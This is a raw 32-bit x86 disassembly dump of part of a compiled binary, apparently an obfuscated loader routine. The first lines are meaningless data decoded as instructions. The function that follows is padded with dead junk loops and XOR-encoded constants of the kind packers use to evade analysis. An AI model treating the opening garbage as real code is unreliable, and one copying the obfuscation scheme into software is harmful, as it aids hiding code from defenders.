  414cf2:	push   esi
  414cf3:	inc    edi
  414cf4:	push   edi
  414cf5:	xchg   BYTE PTR [ecx],dh
  414cf7:	das    
  414cf8:	mov    ebp,0x96e20997
  414cfd:	mov    ds:0xcd23b25,al
  414d02:	je     0x414d74
  414d04:	aaa    
  414d05:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414d06:	push   esp
  414d07:	and    BYTE PTR [esi+ecx*8],dl
  414d0a:	es sub esi,esp
  414d0d:	and    edx,DWORD PTR [ebx+0x3fc430db]
  414d13:	int3   
  414d14:	nop
  414d15:	push   eax
  414d16:	js     0x414d92
  414d18:	ins    BYTE PTR es:[edi],dx
  414d19:	jle    0x414cf3
  414d1b:	pop    ss
  414d1c:	cs mov dl,0x4
  414d1f:	mov    ebx,0x12f03ab1
  414d24:	sbb    eax,0xb89262c4
  414d29:	dec    esi
  414d2a:	mul    DWORD PTR [edi]
  414d2c:	cmp    DWORD PTR [ebx+0x256a21cb],0x5248a9e9
  414d36:	dec    esp
  414d37:	xor    al,bh
  414d39:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414d3a:	add    bl,BYTE PTR [esi+0x74]
  414d3d:	xchg   ecx,eax
  414d3e:	mov    ds:0x145486bd,eax
  414d43:	and    DWORD PTR [ebp+0x69],0xffffffe0
  414d47:	stos   BYTE PTR es:[edi],al
  414d48:	xor    ecx,DWORD PTR [edi*8-0x455c54e9]
  414d4f:	jg     0x414d56
  414d51:	xor    eax,0xfcf79b63
  414d56:	sbb    al,0x2f
  414d58:	jp     0x414cf1
  414d5a:	jmp    0x414d43
  414d5c:	into   
  414d5d:	sti    
  414d5e:	repz loopne 0x414dbc
  414d61:	(bad)  
  414d62:	jmp    0x3bca8a24
  414d67:	jp     0x414d71
  414d69:	jecxz  0x414da3
  414d6b:	test   bl,0x8b
  414d6e:	icebp  
  414d6f:	stos   BYTE PTR es:[edi],al
  414d70:	cmp    dh,ah
  414d72:	stos   DWORD PTR es:[edi],eax
  414d73:	jb     0x414dbf
  414d75:	test   DWORD PTR [edi+edi*4+0x47b32c4b],0xbf0440e0
  414d80:	sti    
  414d81:	pusha  
  414d82:	js     0x414d55
  414d84:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414d85:	sbb    dl,BYTE PTR [eax+0x5cbcd7ef]
  414d8b:	fidiv  WORD PTR [ecx-0x80]
  414d8e:	test   al,0x25
  414d90:	sahf   
  414d91:	cmp    BYTE PTR [edi],0x51
  414d94:	sbb    al,BYTE PTR [ecx]
  414d96:	dec    esi
  414d97:	push   esi
  414d98:	imul   esi,esi,0x92378ff2
  414d9e:	dec    DWORD PTR [edi-0x1c53e42f]
  414da4:	fst    DWORD PTR [ebx]
  414da6:	in     eax,0x92
  414da8:	test   bl,dh
  414daa:	lods   al,BYTE PTR ds:[esi]
  414dab:	imul   edx
  414dad:	imul   eax,DWORD PTR [ecx+esi*2-0x18],0x48
  414db2:	in     al,dx
  414db3:	(bad)  
  414db4:	mov    eax,0x72d1f18d
  414db9:	loopne 0x414df7
  414dbb:	fst    QWORD PTR [ebx]
  414dbd:	jno    0x414d86
  414dbf:	mov    ch,BYTE PTR ds:0x4833a07f
  414dc5:	jmp    0x748cd303
  414dca:	ficomp DWORD PTR [ebp-0x56]
  414dcd:	pop    ss
  414dce:	aam    0x4d
  414dd0:	xor    al,0x6e
  414dd2:	unpckhps xmm1,XMMWORD PTR [esi]
  414dd5:	dec    esp
  414dd6:	adc    eax,0x5d3c165b
  414ddb:	inc    eax
  414ddc:	mov    al,ds:0x70d4d73c
  414de1:	and    DWORD PTR [ebx+0x8],0x48
  414de5:	xor    al,0x45
  414de7:	enter  0x788e,0x2
  414deb:	int3   
  414dec:	pop    ebx
  414ded:	outs   dx,DWORD PTR ds:[esi]
  414dee:	pop    esi
  414def:	lea    ebx,[edi]
  414df1:	mov    al,0x37
  414df3:	retf   
  414df4:	lahf   
  414df5:	mov    edx,ecx
  414df7:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  414df9:	punpckldq mm7,DWORD PTR [eax+0x1dfdc112]
  414e00:	cmc    
  414e01:	pop    esi
  414e02:	sahf   
  414e03:	aas    
  414e04:	mov    cs,WORD PTR [ebx]
  414e06:	adc    BYTE PTR [esi-0x2e253f8c],0x56
  414e0d:	and    DWORD PTR [edx],esi
  414e0f:	test   bh,bl
  414e11:	test   al,0x85
  414e13:	xor    esp,DWORD PTR [edx-0x62]
  414e16:	mov    ah,0x21
  414e18:	sub    edx,DWORD PTR [edi+0x7f]
  414e1b:	pusha  
  414e1c:	loope  0x414e60
  414e1e:	sub    BYTE PTR [edi-0x5059b4c4],0xce
  414e25:	in     al,dx
  414e26:	fcomp  QWORD PTR [ebx-0x539979f1]
  414e2c:	(bad)  
  414e2d:	call   FWORD PTR [ebx+0x5f]
  414e30:	leave  
  414e31:	ret    0x8
  414e34:	push   ebp
  414e35:	mov    ebp,esp
  414e37:	sub    esp,0xa8
  414e3d:	movzx  eax,WORD PTR ds:0x42a815
  414e44:	xor    DWORD PTR ds:0x42a791,eax
  414e4a:	push   ebx
  414e4b:	and    DWORD PTR ds:0x42a7d9,0x2f2e
  414e55:	push   esi
  414e56:	and    DWORD PTR ds:0x42a861,0x0
  414e60:	jmp    0x414e70
  414e65:	mov    eax,ds:0x42a861
  414e6a:	inc    eax
  414e6b:	mov    ds:0x42a861,eax
  414e70:	cmp    DWORD PTR ds:0x42a861,0x10
  414e77:	jae    0x414ea3
  414e7d:	cmp    DWORD PTR ds:0x42a861,0x12
  414e84:	jne    0x414e9e
  414e8a:	push   DWORD PTR [ebp-0x1c]
  414e8d:	push   DWORD PTR [ebp-0x10]
  414e90:	push   DWORD PTR [ebp-0x10]
  414e93:	push   0x5267
  414e98:	call   DWORD PTR ds:0x41d260
  414e9e:	jmp    0x414e65
  414ea3:	push   edi
  414ea4:	xor    esi,esi
  414ea6:	add    ecx,DWORD PTR ds:0x42a86d
  414eac:	push   0x0
  414eae:	push   0x19
  414eb0:	xor    ecx,eax
  414eb2:	pop    ecx
  414eb3:	or     eax,0x2a9a
  414eb8:	xor    edx,edx
  414eba:	sub    eax,DWORD PTR ds:0x42a821
  414ec0:	mov    eax,esi
  414ec2:	div    ecx
  414ec4:	push   edx
  414ec5:	sbb    DWORD PTR ds:0x42a819,0x42a851
  414ecf:	call   DWORD PTR ds:0x41d400
  414ed5:	mov    DWORD PTR ds:0x42a821,0x6c20
  414edf:	inc    esi
  414ee0:	mov    DWORD PTR ds:0x42a855,0x23c0
  414eea:	cmp    esi,0x1000
  414ef0:	jb     0x414ea6
  414ef6:	mov    DWORD PTR [ebp-0x24],0xf89c8538
  414efd:	inc    DWORD PTR ds:0x42a795
  414f03:	mov    DWORD PTR [ebp-0x4],0xf89c8539
  414f0a:	lea    eax,[ebp-0x2c]
  414f0d:	inc    ecx
  414f0e:	mov    DWORD PTR [ebp-0x18],eax
  414f11:	and    DWORD PTR ds:0x42a865,0x42a785
  414f1b:	lea    eax,[ebp-0x30]
  414f1e:	xor    DWORD PTR ds:0x42a7d1,0x42a861
  414f28:	mov    DWORD PTR [ebp-0x14],eax
  414f2b:	or     DWORD PTR ds:0x42a821,edi
  414f31:	mov    eax,ds:0x41eae6
  414f36:	add    DWORD PTR ds:0x42a789,ebx
  414f3c:	mov    eax,DWORD PTR [eax+0x1c8]
  414f42:	mov    eax,DWORD PTR [eax]
  414f44:	and    DWORD PTR ds:0x42a81d,0x0
  414f4e:	jmp    0x414f60
  414f53:	mov    edi,DWORD PTR ds:0x42a81d
  414f59:	inc    edi
  414f5a:	mov    DWORD PTR ds:0x42a81d,edi
  414f60:	cmp    DWORD PTR ds:0x42a81d,0x11
  414f67:	jae    0x414fb6
  414f6d:	cmp    DWORD PTR ds:0x42a81d,0x4
  414f74:	jne    0x414f8d
  414f7a:	push   0x73af
  414f7f:	push   0x42a829
  414f84:	push   DWORD PTR [ebp-0x18]
  414f87:	call   DWORD PTR ds:0x41d264
  414f8d:	cmp    DWORD PTR ds:0x42a81d,0x3
  414f94:	jne    0x414fa7
  414f9a:	mov    edi,DWORD PTR ds:0x42a81d
  414fa0:	inc    edi
  414fa1:	mov    DWORD PTR ds:0x42a81d,edi
  414fa7:	jmp    0x414f53
  414fac:	mov    DWORD PTR ds:0x42a7d5,0x500e
  414fb6:	mov    ecx,DWORD PTR [ebp-0x14]
  414fb9:	and    DWORD PTR ds:0x42a7e9,0x1370
  414fc3:	mov    esi,0x7510850
  414fc8:	xor    ebx,DWORD PTR ds:0x42a78d
  414fce:	xor    eax,esi
  414fd0:	xor    edi,edi
  414fd2:	mov    edi,0x327298
  414fd7:	sub    DWORD PTR ds:0x42a865,ebx
  414fdd:	add    eax,edi
  414fdf:	mov    DWORD PTR [ecx],eax
  414fe1:	mov    DWORD PTR ds:0x42a869,edi
  414fe7:	mov    eax,ds:0x41ed1a
  414fec:	movzx  ebx,BYTE PTR ds:0x42a7d9
  414ff3:	cmp    eax,0x22c02f45
  414ff8:	mov    eax,DWORD PTR [ebp-0x4]
  414ffb:	mov    DWORD PTR ds:0x42a825,edi
  415001:	mov    ebx,0xf89c853c
  415006:	mov    DWORD PTR ds:0x42a865,0x1488
  415010:	je     0x4150a4
  415016:	and    DWORD PTR ds:0x42a869,0x0
  415020:	jmp    0x415032
  415025:	mov    ecx,DWORD PTR ds:0x42a869
  41502b:	inc    ecx
  41502c:	mov    DWORD PTR ds:0x42a869,ecx
  415032:	cmp    DWORD PTR ds:0x42a869,0x13
  415039:	jae    0x41506a
  41503f:	cmp    DWORD PTR ds:0x42a869,0x15
  415046:	jne    0x41505f
  41504c:	push   DWORD PTR [ebp-0xc]
  41504f:	push   0x7b08
  415054:	push   0x10eb
  415059:	call   DWORD PTR ds:0x41d268
  41505f:	jmp    0x415025
  415064:	or     ecx,DWORD PTR ds:0x42a891
  41506a:	mov    ecx,DWORD PTR [ebp-0x24]
  41506d:	xor    eax,esi
  41506f:	xor    DWORD PTR ds:0x42a811,0x57fa
  415079:	add    eax,edi
  41507b:	add    DWORD PTR ds:0x42a8a5,0x42a7d5
  415085:	imul   eax,ecx
  415088:	mov    DWORD PTR ds:0x42a7e1,0x7c29
  415092:	mov    DWORD PTR [ebp-0x24],eax
  415095:	mov    DWORD PTR ds:0x42a7e5,0x1f8
  41509f:	jmp    0x4152c1
  4150a4:	and    DWORD PTR ds:0x42a899,0x0
  4150ae:	mov    ecx,DWORD PTR ds:0x42a899
  4150b4:	inc    ecx
  4150b5:	mov    DWORD PTR ds:0x42a899,ecx
  4150bb:	cmp    DWORD PTR ds:0x42a899,0x2a
  4150c2:	jne    0x4150d1
  4150c8:	push   DWORD PTR [ebp-0x24]
  4150cb:	call   DWORD PTR ds:0x41d26c
  4150d1:	cmp    DWORD PTR ds:0x42a899,0x1c
  4150d8:	jb     0x4150ae
  4150de:	movzx  ecx,BYTE PTR ds:0x42a85d
  4150e5:	xor    ecx,DWORD PTR ds:0x42a86d
  4150eb:	mov    DWORD PTR ds:0x42a85d,ecx
  4150f1:	xor    eax,esi
  4150f3:	add    eax,edi
  4150f5:	and    DWORD PTR ds:0x42a7d1,edi
  4150fb:	mov    ds:0x41ebfa,eax
  415100:	neg    DWORD PTR ds:0x42a811
  415106:	mov    eax,DWORD PTR [ebp-0x24]
  415109:	and    DWORD PTR ds:0x42a895,0x0
  415113:	mov    ecx,DWORD PTR ds:0x42a895
  415119:	inc    ecx
  41511a:	mov    DWORD PTR ds:0x42a895,ecx
  415120:	cmp    DWORD PTR ds:0x42a895,0x29
  415127:	jne    0x415138
  41512d:	push   0x548b
  415132:	call   DWORD PTR ds:0x41d0e4
  415138:	cmp    DWORD PTR ds:0x42a895,0x1c
  41513f:	jb     0x415113
  415145:	and    DWORD PTR ds:0x42a77d,0x0
  41514f:	xor    ecx,ecx
  415151:	add    ecx,DWORD PTR ds:0x42a77d
  415157:	inc    ecx
  415158:	mov    DWORD PTR ds:0x42a77d,ecx
  41515e:	cmp    DWORD PTR ds:0x42a77d,0xe
  415165:	jne    0x415176
  41516b:	push   0x42a9bf
  415170:	call   DWORD PTR ds:0x41d0e8
  415176:	cmp    DWORD PTR ds:0x42a77d,0xd
  41517d:	jne    0x415190
  415183:	mov    ecx,DWORD PTR ds:0x42a77d
  415189:	inc    ecx
  41518a:	mov    DWORD PTR ds:0x42a77d,ecx
  415190:	cmp    DWORD PTR ds:0x42a77d,0x17
  415197:	jb     0x41514f
  41519d:	or     ecx,DWORD PTR ds:0x42a7a1
  4151a3:	xor    eax,esi
  4151a5:	and    DWORD PTR ds:0x42a7e1,0x0
  4151af:	jmp    0x4151c1
  4151b4:	mov    ecx,DWORD PTR ds:0x42a7e1
  4151ba:	inc    ecx
  4151bb:	mov    DWORD PTR ds:0x42a7e1,ecx
  4151c1:	cmp    DWORD PTR ds:0x42a7e1,0x11
  4151c8:	jae    0x415217
  4151ce:	cmp    DWORD PTR ds:0x42a7e1,0x9
  4151d5:	jne    0x4151f4
  4151db:	push   0x577c
  4151e0:	push   DWORD PTR [ebp-0x18]
  4151e3:	push   0x838a
  4151e8:	push   DWORD PTR [ebp-0x10]
  4151eb:	push   DWORD PTR [ebp-0x28]
  4151ee:	call   DWORD PTR ds:0x41d0ec
  4151f4:	cmp    DWORD PTR ds:0x42a7e1,0x8
  4151fb:	jne    0x415210
  415201:	xor    ecx,ecx
  415203:	xor    ecx,DWORD PTR ds:0x42a7e1
  415209:	inc    ecx
  41520a:	mov    DWORD PTR ds:0x42a7e1,ecx
  415210:	jmp    0x4151b4
  415215:	not    ecx
  415217:	add    eax,edi
  415219:	and    DWORD PTR ds:0x42a7e9,0x0
  415223:	mov    ecx,DWORD PTR ds:0x42a7e9
  415229:	inc    ecx
  41522a:	mov    DWORD PTR ds:0x42a7e9,ecx
  415230:	cmp    DWORD PTR ds:0x42a7e9,0x26
  415237:	jne    0x41524b
  41523d:	push   DWORD PTR [ebp-0x20]
  415240:	push   0x2236
  415245:	call   DWORD PTR ds:0x41d270
  41524b:	cmp    DWORD PTR ds:0x42a7e9,0x16
  415252:	jb     0x415223
  415258:	mov    ds:0x41ed1a,eax
  41525d:	add    ecx,DWORD PTR ds:0x42a795
  415263:	mov    eax,DWORD PTR [ebp-0x4]
  415266:	mov    ecx,DWORD PTR ds:0x41ebfa
  41526c:	xor    eax,esi
  41526e:	xor    DWORD PTR ds:0x42a7e9,0x42a8a1
  415278:	add    eax,edi
  41527a:	mov    DWORD PTR ds:0x42a891,0x2781
  415284:	cmp    ecx,eax
  415286:	mov    DWORD PTR ds:0x42a861,0x2b32
  415290:	jne    0x4152c1
  415296:	mov    DWORD PTR ds:0x42a859,0x7717
  4152a0:	push   ebx
  4152a1:	sub    DWORD PTR ds:0x42a785,0x42a89d
  4152ab:	push   DWORD PTR [ebp-0x4]
  4152ae:	push   DWORD PTR [ebp-0x24]
  4152b1:	sub    DWORD PTR ds:0x42a85d,0x42a779
  4152bb:	call   DWORD PTR ds:0x41ebf2
  4152c1:	mov    eax,ds:0x41eae6
  4152c6:	mov    eax,DWORD PTR [eax+0x18c]
  4152cc:	mov    eax,DWORD PTR [eax]
  4152ce:	mov    DWORD PTR [ebp-0x44],eax
  4152d1:	mov    DWORD PTR [ebp-0x10],ebx
  4152d4:	and    DWORD PTR ds:0x42a7ed,0x0
  4152de:	jmp    0x4152f0
  4152e3:	mov    ecx,DWORD PTR ds:0x42a7ed
  4152e9:	inc    ecx
  4152ea:	mov    DWORD PTR ds:0x42a7ed,ecx
  4152f0:	cmp    DWORD PTR ds:0x42a7ed,0x1a
  4152f7:	jae    0x4153d6
  4152fd:	cmp    DWORD PTR ds:0x42a7ed,0x24
  415304:	jne    0x41531a
  41530a:	push   0x42a869
  41530f:	push   0x28eb
  415314:	call   DWORD PTR ds:0x41d0f0
  41531a:	jmp    0x4152e3
  41531f:	mov    DWORD PTR ds:0x42a7a1,0x10
  415329:	cmp    DWORD PTR ds:0x42a7a1,0x0
  415330:	je     0x4153d6
  415336:	cmp    DWORD PTR ds:0x42a7a1,0x7
  41533d:	jne    0x415351
  415343:	push   0x572d
  415348:	push   DWORD PTR [ebp-0xc]
  41534b:	call   DWORD PTR ds:0x41d0f4
  415351:	cmp    DWORD PTR ds:0x42a7a1,0x8
  415358:	jne    0x41536d
  41535e:	xor    edx,edx
  415360:	add    edx,DWORD PTR ds:0x42a7a1
  415366:	dec    edx
  415367:	mov    DWORD PTR ds:0x42a7a1,edx
  41536d:	mov    edx,DWORD PTR ds:0x42a7a1
  415373:	dec    edx
  415374:	mov    DWORD PTR ds:0x42a7a1,edx
  41537a:	jmp    0x415329
  41537f:	and    DWORD PTR ds:0x42a811,0x0
  415389:	jmp    0x415399
  41538e:	mov    eax,ds:0x42a811
  415393:	inc    eax
  415394:	mov    ds:0x42a811,eax
  415399:	cmp    DWORD PTR ds:0x42a811,0x13
  4153a0:	jae    0x4153d6
  4153a6:	cmp    DWORD PTR ds:0x42a811,0x1b
  4153ad:	jne    0x4153cb
  4153b3:	push   0x3cd6
  4153b8:	push   0x42a779
  4153bd:	push   DWORD PTR [ebp-0x1c]
  4153c0:	push   0x865d
  4153c5:	call   DWORD PTR ds:0x41d0f8
  4153cb:	jmp    0x41538e
  4153d0:	or     DWORD PTR ds:0x42a7dd,ecx
  4153d6:	mov    DWORD PTR [ebp-0x10],ebx
  4153d9:	mov    DWORD PTR [ebp-0x10],ebx
  4153dc:	mov    DWORD PTR [ebp-0x14],0xf89c8538
  4153e3:	and    DWORD PTR ds:0x42a851,0x0
  4153ed:	mov    eax,ds:0x42a851
  4153f2:	inc    eax
  4153f3:	mov    ds:0x42a851,eax
  4153f8:	cmp    DWORD PTR ds:0x42a851,0xc
  4153ff:	jne    0x415416
  415405:	push   DWORD PTR [ebp-0x24]
  415408:	push   DWORD PTR [ebp-0x24]
  41540b:	push   0x42a952
  415410:	call   DWORD PTR ds:0x41d0fc
  415416:	cmp    DWORD PTR ds:0x42a851,0xb
  41541d:	jne    0x415431
  415423:	xor    eax,eax
  415425:	xor    eax,DWORD PTR ds:0x42a851
  41542b:	inc    eax
  41542c:	mov    ds:0x42a851,eax
  415431:	cmp    DWORD PTR ds:0x42a851,0x17
  415438:	jb     0x4153ed
  41543e:	adc    DWORD PTR ds:0x42a781,ecx
  415444:	mov    DWORD PTR [ebp-0x10],ebx
  415447:	mov    DWORD PTR [ebp-0x10],0xf89c8520
  41544e:	and    ecx,eax
  415450:	mov    eax,DWORD PTR [ebp-0x24]
  415453:	mov    DWORD PTR ds:0x42a8ad,0x1d
  41545d:	cmp    DWORD PTR ds:0x42a8ad,0x0
  415464:	je     0x4154d3
  41546a:	cmp    DWORD PTR ds:0x42a8ad,0xe
  415471:	jne    0x415495
  415477:	push   DWORD PTR [ebp-0x1c]
  41547a:	push   0x42a789
  41547f:	push   DWORD PTR [ebp-0x14]
  415482:	push   0x4571
  415487:	push   0x5504
  41548c:	push   DWORD PTR [ebp-0x24]
  41548f:	call   DWORD PTR ds:0x41d100
  415495:	cmp    DWORD PTR ds:0x42a8ad,0xf
  41549c:	jne    0x4154af
  4154a2:	mov    edx,DWORD PTR ds:0x42a8ad
  4154a8:	dec    edx
  4154a9:	mov    DWORD PTR ds:0x42a8ad,edx
  4154af:	mov    edx,DWORD PTR ds:0x42a8ad
  4154b5:	dec    edx
  4154b6:	mov    DWORD PTR ds:0x42a8ad,edx
  4154bc:	jmp    0x41545d
  4154c1:	mov    edx,DWORD PTR ds:0x42a7d9
  4154c7:	and    edx,DWORD PTR ds:0x42a86d
  4154cd:	mov    DWORD PTR ds:0x42a7d9,edx
  4154d3:	mov    ecx,DWORD PTR [ebp-0x4]
  4154d6:	and    DWORD PTR ds:0x42a7a1,0x65ac
  4154e0:	mov    edx,DWORD PTR [ebp-0x4]
  4154e3:	add    DWORD PTR ds:0x42a855,0x42a811
  4154ed:	xor    edx,esi
  4154ef:	xor    DWORD PTR ds:0x42a855,0x571
  4154f9:	xor    ecx,esi
  4154fb:	add    ecx,edx
  4154fd:	mov    edx,DWORD PTR [ebp-0x4]
  415500:	xor    eax,esi
  415502:	or     DWORD PTR ds:0x42a7e5,0x42a825
  41550c:	xor    edx,esi
  41550e:	add    eax,edi
  415510:	lea    ecx,[ecx+edx*1+0x9757c8]
  415517:	mov    DWORD PTR ds:0x42a815,0x1d99
  415521:	mov    DWORD PTR [ebp-0x20],eax
  415524:	mov    DWORD PTR ds:0x42a781,0x9d6
  41552e:	cmp    eax,ecx
  415530:	ja     0x415630
  415536:	jmp    0x415589
  41553b:	and    DWORD PTR ds:0x42a7dd,0x0
  415545:	mov    ecx,DWORD PTR ds:0x42a7dd
  41554b:	inc    ecx
  41554c:	mov    DWORD PTR ds:0x42a7dd,ecx
  415552:	cmp    DWORD PTR ds:0x42a7dd,0x21
  415559:	jne    0x415577
  41555f:	push   DWORD PTR [ebp-0x14]
  415562:	push   0x42a865
  415567:	push   0x6e14
  41556c:	push   0x8733
  415571:	call   DWORD PTR ds:0x41d104
  415577:	cmp    DWORD PTR ds:0x42a7dd,0x12
  41557e:	jb     0x415545
  415584:	sbb    eax,ecx
  415586:	mov    eax,DWORD PTR [ebp-0x20]
  415589:	and    DWORD PTR ds:0x42a89d,0x0
  415593:	jmp    0x4155a7
  415598:	xor    ecx,ecx
  41559a:	add    ecx,DWORD PTR ds:0x42a89d
  4155a0:	inc    ecx
  4155a1:	mov    DWORD PTR ds:0x42a89d,ecx
  4155a7:	cmp    DWORD PTR ds:0x42a89d,0x1c
  4155ae:	jae    0x4155d4
  4155b4:	cmp    DWORD PTR ds:0x42a89d,0x21
  4155bb:	jne    0x4155cf
  4155c1:	push   0x6aa9
  4155c6:	push   DWORD PTR [ebp-0x24]
  4155c9:	call   DWORD PTR ds:0x41d108
  4155cf:	jmp    0x415598
  4155d4:	mov    ecx,DWORD PTR [ebp-0x4]
  4155d7:	xor    ecx,esi
  4155d9:	lea    eax,[ecx+eax*1+0x327298]
  4155e0:	push   eax
  4155e1:	mov    eax,DWORD PTR [ebp-0x14]
  4155e4:	xor    eax,esi
  4155e6:	lea    eax,[ebp+eax*1+0x3272a0]
  4155ed:	push   eax
  4155ee:	mov    eax,ds:0x41eae6
  4155f3:	push   DWORD PTR [eax+0x1bc]
  4155f9:	call   0x4043a1
  4155fe:	mov    eax,DWORD PTR [ebp-0x4]
  415601:	mov    ecx,DWORD PTR [ebp-0x20]
  415604:	xor    eax,esi
  415606:	lea    eax,[ecx+eax*1+0x327298]
  41560d:	mov    ecx,DWORD PTR [ebp-0x4]
  415610:	mov    edx,DWORD PTR [ebp-0x4]
  415613:	xor    edx,esi
  415615:	xor    ecx,esi
  415617:	add    ecx,edx
  415619:	mov    edx,DWORD PTR [ebp-0x4]
  41561c:	xor    edx,esi
  41561e:	lea    ecx,[ecx+edx*1+0x9757c8]
  415625:	mov    DWORD PTR [ebp-0x20],eax
  415628:	cmp    eax,ecx
  41562a:	jbe    0x41553b
  415630:	mov    eax,DWORD PTR [ebp+0xc]
  415633:	mov    ds:0x41e96a,eax
  415638:	mov    eax,DWORD PTR [ebp+0x10]
  41563b:	mov    ds:0x41ebbe,eax
  415640:	mov    eax,ds:0x41e96a
  415645:	mov    ecx,DWORD PTR [ebp-0x18]
  415648:	push   DWORD PTR [ebp-0x44]
  41564b:	sub    eax,edi
  41564d:	push   DWORD PTR [ebp-0x30]
  415650:	xor    eax,esi
  415652:	mov    DWORD PTR [ecx],eax
  415654:	push   DWORD PTR [ebp-0x2c]
  415657:	call   0x41594a
  41565c:	sub    eax,edi
  41565e:	xor    eax,esi
  415660:	mov    DWORD PTR [ebp+0xc],eax
  415663:	mov    ecx,DWORD PTR [ebp-0x4]
  415666:	mov    eax,DWORD PTR [ebp+0xc]
  415669:	xor    ecx,esi
  41566b:	add    ecx,edi
  41566d:	xor    edx,edx
  41566f:	div    ecx
  415671:	mov    ecx,DWORD PTR [ebp-0x24]
  415674:	cmp    ecx,eax
  415676:	jne    0x41589f
  41567c:	mov    eax,ds:0x41eae6
  415681:	mov    DWORD PTR [ebp+0x10],eax
  415684:	mov    eax,ds:0x41ebf6
  415689:	mov    DWORD PTR [ebp-0x50],eax
  41568c:	mov    DWORD PTR [ebp-0x18],0xf89c8538
  415693:	mov    DWORD PTR [ebp-0x20],0xf89c8539
  41569a:	mov    DWORD PTR [ebp-0x4c],0xf89cb538
  4156a1:	mov    DWORD PTR [ebp-0x64],0xf89f0538
  4156a8:	mov    DWORD PTR [ebp-0x60],0xf89c85f8
  4156af:	mov    DWORD PTR [ebp-0x54],0xf89c85d8
  4156b6:	mov    eax,DWORD PTR [ebp-0x18]
  4156b9:	xor    eax,esi
  4156bb:	add    eax,edi
  4156bd:	mov    DWORD PTR [ebp-0xc],eax
  4156c0:	mov    DWORD PTR [ebp-0x3c],0xf89c853d
  4156c7:	mov    BYTE PTR [ebp-0x25],0x67
  4156cb:	mov    eax,DWORD PTR [ebp-0x18]
  4156ce:	xor    eax,esi
  4156d0:	add    eax,edi
  4156d2:	mov    DWORD PTR [ebp-0xc],eax
  4156d5:	mov    eax,DWORD PTR [ebp-0x54]
  4156d8:	xor    eax,esi
  4156da:	add    eax,edi
  4156dc:	mov    DWORD PTR [ebp-0x40],eax
  4156df:	mov    eax,DWORD PTR [ebp-0x4c]
  4156e2:	xor    eax,esi
  4156e4:	add    eax,edi
  4156e6:	mov    DWORD PTR [ebp-0x38],eax
  4156e9:	mov    eax,DWORD PTR [ebp-0x3c]
  4156ec:	xor    eax,esi
  4156ee:	add    eax,edi
  4156f0:	mov    DWORD PTR [ebp-0x34],eax
  4156f3:	lea    eax,[ebp-0xa8]
  4156f9:	mov    DWORD PTR [ebp+0xc],eax
  4156fc:	mov    eax,DWORD PTR [ebp-0x18]
  4156ff:	mov    DWORD PTR [ebp-0x14],eax
  415702:	mov    eax,DWORD PTR [ebp-0x20]
  415705:	mov    DWORD PTR [ebp-0x5c],ebx
  415708:	mov    DWORD PTR [ebp-0x10],eax
  41570b:	mov    eax,DWORD PTR [ebp-0x5c]
  41570e:	mov    ecx,DWORD PTR [ebp+0xc]
  415711:	xor    eax,esi
  415713:	add    eax,0x327298
  415718:	mov    DWORD PTR [ecx],eax
  41571a:	mov    eax,DWORD PTR [ebp-0x14]
  41571d:	mov    ecx,DWORD PTR [ebp+0xc]
  415720:	xor    eax,esi
  415722:	add    eax,edi
  415724:	mov    DWORD PTR [ecx+0x4],eax
  415727:	mov    eax,DWORD PTR [ebp-0x34]
  41572a:	mov    ecx,DWORD PTR [ebp+0xc]
  41572d:	mov    DWORD PTR [ecx+0x8],eax
  415730:	mov    eax,DWORD PTR [ebp-0x38]
  415733:	mov    ecx,DWORD PTR [ebp+0xc]
  415736:	mov    DWORD PTR [ecx+0xc],eax
  415739:	mov    eax,DWORD PTR [ebp-0x40]
  41573c:	mov    ecx,DWORD PTR [ebp+0xc]
  41573f:	mov    DWORD PTR [ecx+0x10],eax
  415742:	mov    eax,eax
  415744:	mov    eax,DWORD PTR [ebp-0x10]
  415747:	xor    eax,esi
  415749:	add    eax,edi
  41574b:	je     0x41577c
  415751:	lea    eax,[ebp-0xa8]
  415757:	push   eax
  415758:	mov    eax,DWORD PTR [ebp-0x20]
  41575b:	xor    eax,esi
  41575d:	add    eax,edi
  41575f:	push   eax
  415760:	mov    eax,DWORD PTR [ebp+0x10]
  415763:	add    eax,0xaa
  415768:	push   eax
  415769:	mov    eax,DWORD PTR [ebp+0x10]
  41576c:	mov    eax,DWORD PTR [eax+0x198]
  415772:	push   DWORD PTR [eax]
  415774:	call   0x419198
  415779:	mov    DWORD PTR [ebp-0x8],eax
  41577c:	cmp    DWORD PTR [ebp-0x8],0x0
  415780:	je     0x41589f
  415786:	lea    eax,[ebp-0xc]
  415789:	mov    DWORD PTR [ebp-0x38],eax
  41578c:	mov    eax,DWORD PTR [ebp-0x60]
  41578f:	xor    eax,esi
  415791:	add    eax,edi
  415793:	mov    DWORD PTR [ebp-0x40],eax
  415796:	mov    eax,DWORD PTR [ebp-0x3c]
  415799:	xor    eax,esi
  41579b:	add    eax,edi
  41579d:	mov    DWORD PTR [ebp-0x10],eax
  4157a0:	mov    eax,DWORD PTR [ebp-0x8]
  4157a3:	mov    DWORD PTR [ebp-0x14],eax
  4157a6:	lea    eax,[ebp-0xa8]
  4157ac:	mov    DWORD PTR [ebp+0xc],eax
  4157af:	mov    eax,DWORD PTR [ebp-0x18]
  4157b2:	mov    DWORD PTR [ebp-0x18],eax
  4157b5:	mov    eax,DWORD PTR [ebp-0x20]
  4157b8:	mov    DWORD PTR [ebp-0x48],ebx
  4157bb:	mov    DWORD PTR [ebp-0x34],eax
  4157be:	mov    eax,DWORD PTR [ebp-0x48]
  4157c1:	mov    ecx,DWORD PTR [ebp+0xc]
  4157c4:	xor    eax,esi
  4157c6:	add    eax,0x327298
  4157cb:	mov    DWORD PTR [ecx],eax
  4157cd:	mov    eax,DWORD PTR [ebp-0x14]
  4157d0:	mov    ecx,DWORD PTR [ebp+0xc]
  4157d3:	mov    DWORD PTR [ecx+0x4],eax
  4157d6:	mov    eax,DWORD PTR [ebp-0x10]
  4157d9:	mov    ecx,DWORD PTR [ebp+0xc]
  4157dc:	mov    DWORD PTR [ecx+0x8],eax
  4157df:	mov    eax,DWORD PTR [ebp-0x40]
  4157e2:	mov    ecx,DWORD PTR [ebp+0xc]
  4157e5:	mov    DWORD PTR [ecx+0xc],eax
  4157e8:	mov    eax,DWORD PTR [ebp-0x38]
  4157eb:	mov    ecx,DWORD PTR [ebp+0xc]
  4157ee:	mov    DWORD PTR [ecx+0x10],eax
  4157f1:	mov    eax,eax
  4157f3:	mov    eax,DWORD PTR [ebp-0x14]
